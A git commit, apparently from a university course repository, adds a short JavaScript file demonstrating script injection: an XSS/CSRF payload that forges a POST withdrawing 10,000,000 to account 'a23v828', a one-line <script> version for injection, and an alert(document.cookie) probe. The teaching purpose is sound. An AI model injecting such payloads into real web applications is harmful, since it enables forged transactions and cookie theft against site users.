1969ca82e6410b93bf0338da63af1468c6e53f1b
Scot Morse <morses@wou.edu>
2024-04-30 20:22:56 -0700

    add example to demonstrate JS script injection

---
+++ examples/javascript_injection/XSS-CSRF/attack_code.js
@@ -0,0 +1,13 @@
+﻿// Pure JS form encoded data: https://developer.mozilla.org/en-US/docs/Web/API/FormData/Using_FormData_Objects
+let formData = new FormData();
+formData.append('accountNumber', 'a23v828');
+formData.append('amount', 10000000);
+let request = new XMLHttpRequest();
+request.open('POST', '/Home/WithdrawFunds');
+request.send(formData);
+
+// as a single line in script element
+// <script>let formData = new FormData();formData.append('accountNumber', 'a23v828');formData.append('amount', 10000000);let request = new XMLHttpRequest();request.open('POST', '/Home/WithdrawFunds');request.send(formData);</script>
+
+// also try 
+// <script>alert(document.cookie);</script>
